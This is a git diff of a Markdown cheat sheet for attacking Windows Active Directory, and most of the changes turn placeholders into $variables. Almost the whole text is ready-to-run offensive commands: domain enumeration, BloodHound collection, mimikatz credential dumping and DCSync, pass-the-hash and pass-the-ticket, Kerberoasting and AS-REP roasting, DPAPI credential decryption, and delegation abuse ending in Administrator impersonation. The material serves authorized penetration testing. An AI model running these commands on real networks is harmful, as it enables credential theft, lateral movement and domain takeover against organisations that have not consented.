@@ -6,6 +6,8 @@ Hack Responsibly.
 Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
 {% endhint %}
 
+## TODO: cleanup code examples for scripting \($var, etc.\)
+
 ## Tools
 
 * [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
@@ -29,16 +31,16 @@ Always ensure you have **explicit** permission to access any computer system **b
 
   ```text
   Get-ADDomainController
-  Get-ADDomainController -Identity <DomainName>
+  Get-ADDomainController -Identity $DomainName
   ```
 
 * **Enumerate Domain Users:**
 
   ```text
-  Get-ADUser -Filter * -Identity <user> -Properties *
+  Get-ADUser -Filter * -Identity $user -Properties *
 
-  #Get a spesific "string" on a user's attribute
-  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
+  #Get a specific "string" on a user's attribute
+  Get-ADUser -Filter 'Description -like "*pass*"' -Properties Description | select Name, Description
   ```
 
 * **Enum Domain Computers:**
@@ -52,14 +54,14 @@ Always ensure you have **explicit** permission to access any computer system **b
 
   ```text
   Get-ADTrust -Filter *
-  Get-ADTrust -Identity <DomainName>
+  Get-ADTrust -Identity $DomainName
   ```
 
 * **Enum Forest Trust:**
 
   ```text
   Get-ADForest
-  Get-ADForest -Identity <ForestName>
+  Get-ADForest -Identity $ForestName
 
   #Domains of Forest Enumeration
   (Get-ADForest).Domains
@@ -74,7 +76,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ### Using [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
 
 * **Get Current Domain:** `Get-NetDomain`
-* **Enum Other Domains:** `Get-NetDomain -Domain <DomainName>`
+* **Enum Other Domains:** `Get-NetDomain -Domain $DomainName`
 * **Get Domain SID:** `Get-DomainSID`
 * **Get Domain Policy:**
 
@@ -90,14 +92,14 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
   ```text
   Get-NetDomainController
-  Get-NetDomainController -Domain <DomainName>
+  Get-NetDomainController -Domain $DomainName
   ```
 
 * **Enumerate Domain Users:**
 
   ```text
   Get-NetUser
-  Get-NetUser -SamAccountName <user> 
+  Get-NetUser -SamAccountName $user
   Get-NetUser | select cn
   Get-UserProperty
 
@@ -108,13 +110,13 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Find-UserField -SearchField Description -SearchTerm "wtver"
 
   #Enumerate user logged on a machine
-  Get-NetLoggedon -ComputerName <ComputerName>
+  Get-NetLoggedon -ComputerName $ComputerName
 
   #Enumerate Session Information for a machine
-  Get-NetSession -ComputerName <ComputerName>
+  Get-NetSession -ComputerName $ComputerName
 
   #Enumerate domain machines of the current/specified domain where specific users are logged into
-  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
+  Find-DomainUserLocation -Domain $DomainName | Select-Object UserName, SessionFromName
   ```
 
 * **Enum Domain Computers:**
@@ -130,10 +132,10 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 * **Enum Groups and Group Members:**
 
   ```text
-  Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
+  Get-NetGroupMember -GroupName "$GroupName" -Domain $DomainName
 
   #Enumerate the members of a specified group of the domain
-  Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member
+  Get-DomainGroup -Identity $GroupName | Select-Object -ExpandProperty Member
 
   #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
   Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
@@ -155,54 +157,54 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   Get-NetGPO
 
   # Shows active Policy on specified machine
-  Get-NetGPO -ComputerName <Name of the PC>
+  Get-NetGPO -ComputerName $ComputerName
   Get-NetGPOGroup
 
   #Get users that are part of a Machine's local Admin group
-  Find-GPOComputerAdmin -ComputerName <ComputerName>
+  Find-GPOComputerAdmin -ComputerName $ComputerName
   ```
 
 * **Enum OUs:**
 
   ```text
   Get-NetOU -FullData 
-  Get-NetGPO -GPOname <The GUID of the GPO>
+  Get-NetGPO -GPOname $GPO_GUID
   ```
 
 * **Enum ACLs:**
 
   ```text
   # Returns the ACLs associated with the specified account
-  Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
+  Get-ObjectAcl -SamAccountName $AccountName -ResolveGUIDs
   Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
 
   #Search for interesting ACEs
   Invoke-ACLScanner -ResolveGUIDs
 
   #Check the ACLs associated with a specified path (e.g smb share)
-  Get-PathAcl -Path "\\Path\Of\A\Share"
+  Get-PathAcl -Path $Share_Path
   ```
 
 * **Enum Domain Trust:**
 
   ```text
   Get-NetDomainTrust
-  Get-NetDomainTrust -Domain <DomainName>
+  Get-NetDomainTrust -Domain $DomainName
   ```
 
 * **Enum Forest Trust:**
 
   ```text
   Get-NetForestDomain
-  Get-NetForestDomain Forest <ForestName>
+  Get-NetForestDomain Forest $ForestName
 
   #Domains of Forest Enumeration
   Get-NetForestDomain
-  Get-NetForestDomain Forest <ForestName>
+  Get-NetForestDomain Forest $ForestName
 
   #Map the Trust of the Forest
   Get-NetForestTrust
-  Get-NetDomainTrust -Forest <ForestName>
+  Get-NetDomainTrust -Forest $ForestName
   ```
 
 * **User Hunting:**
@@ -233,11 +235,11 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 ```text
 #Using .exe ingestor
-.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+.\SharpHound.exe --CollectionMethod All --LDAPUser $UserName --LDAPPass $Password --JSONFolder $OutFile_Path>
     
 #Using powershell module ingestor
 .\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
+Invoke-BloodHound -CollectionMethod All  -LDAPUser $UserName -LDAPPass $Password -OutputDirectory $OutFile_Path
 ```
 
 ### Useful Enumeration Tools
@@ -253,7 +255,7 @@ Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Passwor
 * [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
 * [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
 * [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
-* [FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges
+* [FullPowers](https://github.com/itm4n/FullPowers) Restore a service account's privileges
 * [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
 
   ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803
@@ -275,41 +277,42 @@ Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Passwor
 
 ## Lateral Movement
 
-### Powershell Remoting
+### PowerShell Remoting
 
 ```text
 #Enable Powershell Remoting on current Machine (Needs Admin Access)
 Enable-PSRemoting
 
 #Entering or Starting a new PSSession (Needs Admin Access)
-$sess = New-PSSession -ComputerName <Name>
-Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
+$sess = New-PSSession -ComputerName $ComputerName>
+Enter-PSSession -ComputerName $ComputerName 
+-OR-
+Enter-PSSession -Sessions $SessionName
 ```
 
 ### Remote Code Execution with PS Credentials
 
 ```text
-$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
+$SecPassword = ConvertTo-SecureString '$Password' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
-Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
+Invoke-Command -ComputerName $ComputerName -Credential $Cred -ScriptBlock {whoami /all}
 ```
 
-### Import a powershell module and execute its functions remotely
+### Import a PowerShell module and execute its functions remotely
 
 ```text
 #Execute the command and start a session
-Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 
+Invoke-Command -Credential $cred -ComputerName $ComputerName -FilePath $PSModule_FilePath -Session $sess 
 
 #Interact with the session
 Enter-PSSession -Session $sess
-
 ```
 
 ### Executing Remote Stateful commands
 
 ```text
 #Create a new session
-$sess = New-PSSession -ComputerName <NameOfComputer>
+$sess = New-PSSession -ComputerName $ComputerName
 
 #Execute command on the session
 Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
@@ -330,7 +333,7 @@ mimikatz sekurlsa::logonpasswords
 
 #(Over) Pass The Hash
 mimikatz privilege::debug
-mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
+mimikatz sekurlsa::pth /user:$UserName /ntlm:$NTLM_Hash /domain:$Domain_FQDN
 
 #List all available kerberos tickets in memory
 mimikatz sekurlsa::tickets
@@ -359,13 +362,13 @@ mimikatz token::elevate
 mimikatz lsadump::lsa /inject
 
 #Dump the Domain's Credentials without touching DC's LSASS and also remotely
-mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+mimikatz lsadump::dcsync /domain:$Domain_FQDN /all
 
 #List and Dump local kerberos credentials
 mimikatz kerberos::list /dump
 
 #Pass The Ticket
-mimikatz kerberos::ptt <PathToKirbiFile>
+mimikatz kerberos::ptt $KirbiFile_Path
 
 #List TS/RDP sessions
 mimikatz ts::sessions
@@ -450,26 +453,26 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 * Impacket:
 
 ```text
-python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
+python GetUserSPNs.py $DomainName/$DomainUser:$Password -outputfile $Out_File
 ```
 
 * Rubeus:
 
 ```text
 #Kerberoasting and outputing on a file with a spesific format
-Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
+Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName
 
 #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
-Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
+Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /rc4opsec
 
 #Kerberoast AES enabled accounts
-Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
+Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /aes
  
 #Kerberoast spesific user account
-Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
+Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /user:$UserName /simple
 
 #Kerberoast by specifying the authentication credentials 
-Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
+Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /creduser:$UserName> /credpassword:$Password>
 ```
 
 ### ASREPRoast
@@ -480,16 +483,18 @@ blob and bruteforce it offline._
 * PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
 * AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
 
-Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more! Check for interesting permissions on accounts:
+Forcefully Disable Kerberos Preauth on an account I have Write permissions or more! Check for interesting permissions on accounts:
 
-**Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
+{% hint style="info" %}
+We add a filter \(e.g. RDPUsers\) to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
+{% endhint %}
 
 PowerView:
 
 ```text
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 Disable Kerberos Preauth:
-Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
+Set-DomainObject -Identity $UserAccount -XOR @{useraccountcontrol=4194304} -Verbose
 Check if the value changed:
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
@@ -497,31 +502,33 @@ Get-DomainUser -PreauthNotRequired -Verbose
 And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.
 
 ```text
-#Get a spesific Accounts hash:
-Get-ASREPHash -UserName <UserName> -Verbose
+#Get a specific Account's hash:
+Get-ASREPHash -UserName $UserName -Verbose
 
-#Get any ASREPRoastable Users hashes:
+#Get any ASREPRoastable Users' hashes:
 Invoke-ASREPRoast -Verbose
 ```
 
 Using Rubeus:
 
 ```text
+#For $Format choose either hashcat or john
+
 #Trying the attack for all domain users
-Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+Rubeus.exe asreproast /format:$Format /domain:$DomainName /outfile:$Out_File
 
-#ASREPRoast spesific user
-Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+#ASREPRoast a specific user
+Rubeus.exe asreproast /user:$UserName /format:$Format /domain:$DomainName /outfile:$Out_File
 
-#ASREPRoast users of a spesific OU (Organization Unit)
-Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+#ASREPRoast users of a specific OU (Organization Unit)
+Rubeus.exe asreproast /ou:$OU_Name /format:$Format /domain:$DomainName /outfile:$Out_File
 ```
 
 Using Impacket:
 
 ```text
 #Trying the attack for the specified users on the file
-python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
+python GetNPUsers.py $DomainName/ -usersfile $Users_File -outputfile $Out_File
 ```
 
 ### Password Spray Attack
@@ -537,7 +544,7 @@ If we have harvest some passwords by compromising a user account, we can use thi
 
 ### Force Set SPN
 
-_If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._
+_If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and brute force it._
 
 * PowerView:
 
@@ -546,23 +553,23 @@ _If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
  
 #Check if current user has already an SPN setted:
-Get-DomainUser -Identity <UserName> | select serviceprincipalname
+Get-DomainUser -Identity $UserName | select serviceprincipalname
  
 #Force set the SPN on the account:
-Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
+Set-DomainObject $UserName -Set @{serviceprincipalname='ops/whatever1'}
 ```
 
 * AD Module:
 
 ```text
 #Check if current user has already an SPN setted
-Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
+Get-ADUser -Identity $UserName -Properties ServicePrincipalName | select ServicePrincipalName
   
 #Force set the SPN on the account:
-Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
+Set-ADUser -Identiny $UserName -ServicePrincipalNames @{Add='ops/whatever1'}
 ```
 
-Finally use any tool from before to grab the hash and kerberoast it!
+Finally use any tool from before to grab the hash and Kerberoast it!
 
 ### Abusing Shadow Copies
 
@@ -579,9 +586,9 @@ diskshadow list shadows all
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
-1. You can dump the backuped SAM database and harvest credentials.
+1. You can dump the backed-up SAM database and harvest credentials.
 2. Look for DPAPI stored creds and decrypt them.
-3. Access backuped sensitive files.
+3. Access backed-up sensitive files.
 
 ### List and Decrypt Stored Credentials using Mimikatz
 
@@ -592,20 +599,20 @@ Usually encrypted credentials are stored in:
 
 ```text
 #By using the cred function of mimikatz we can enumerate the cred object and get information about it:
-dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
+dpapi::cred /in:"%appdata%\Microsoft\Credentials\$CredHash"
 
 #From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
 #Lets enumerate the Master Key:
-dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"
+dpapi::masterkey /in:"%appdata%\Microsoft\Protect\$UserSID\$MasterKeyGUID"
 
 #Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
-dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc
+dpapi::masterkey /in:"%appdata%\Microsoft\Protect\$UserSID\$MasterKeyGUID" /rpc
 
 #We now have the masterkey in our local cache:
 dpapi::cache
 
 #Finally we can decrypt the credential using the cached masterkey:
-dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
+dpapi::cred /in:"%appdata%\Microsoft\Credentials\$CredHash"
 ```
 
 Detailed Article: [DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
@@ -624,14 +631,13 @@ Get-NetComputer -UnConstrained
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 
 #Command to monitor any incoming sessions on our compromised server
-Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay   
-<WaitInterval> -Verbose
+Invoke-UserHunter -ComputerName $ComputerName -Poll $Num_Seconds -UserName $UserName -Delay $WaitInterval -Verbose
 
 #Dump the tickets to disk:
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
 #Impersonate the user using ptt attack:
-Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
+Invoke-Mimikatz -Command '"kerberos::ptt $Ticket_Path"'
 ```
 
 **Note:** We can also use Rubeus!
@@ -646,26 +652,26 @@ Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 
 #If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
-tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>
+tgt::ask /user:$UserName /domain:$Domain_FQDN /rc4:$Password_Hash
 
 #Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
-tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>
+tgs::s4u /tgt:$TGT_Path /user:$UserToImpersonate@$Domain_FQDN /service:$Service_SPN
 
 #Finally use mimikatz to ptt the TGS
-Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
+Invoke-Mimikatz -Command '"kerberos::ptt $TGS_Path"'
 ```
 
 _ALTERNATIVE:_ Using Rubeus:
 
 ```text
-Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
+Rubeus.exe s4u /user:$UserName /rc4:$NTLM_Hash /impersonateuser:$UserToImpersonate /msdsspn:"$Service_SPN" /altservice:<Optional> /ptt
 ```
 
 Now we can access the service as the impersonated user!
 
 🚩 **What if we have delegation rights for only a spesific SPN? \(e.g TIME\):**
 
-In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.
+In this case we can still abuse a feature of Kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. That gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.
 
 ### Resource Based Constrained Delegation
 
@@ -684,11 +690,11 @@ Exploitation Example:
 ```text
 #Import Powermad and use it to create a new MACHINE ACCOUNT
 . .\Powermad.ps1
-New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
+New-MachineAccount -MachineAccount $MachineAccountName -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
 
 #Import PowerView and get the SID of our new created machine account
 . .\PowerView.ps1
-$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
+$ComputerSid = Get-DomainComputer $MachineAccountName -Properties objectsid | Select -Expand objectsid
 
 #Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
@@ -701,8 +707,9 @@ Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonb
 #After that we need to get the RC4 hash of the new machine account's password using Rubeus
 Rubeus.exe hash /password:'p@ssword!'
 
+#TODO: Fix these last two examples (Domain and computername needed?)
 #And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
-Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
+Rubeus.exe s4u /user:$MachineAccountName /rc4:$RC4HashOfMachineAccountPassword /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:$Domain_FQDN /ptt
 
 #Finally we can access the C$ drive of the target machine
 dir \\TargetMachine.wtver.domain\C$
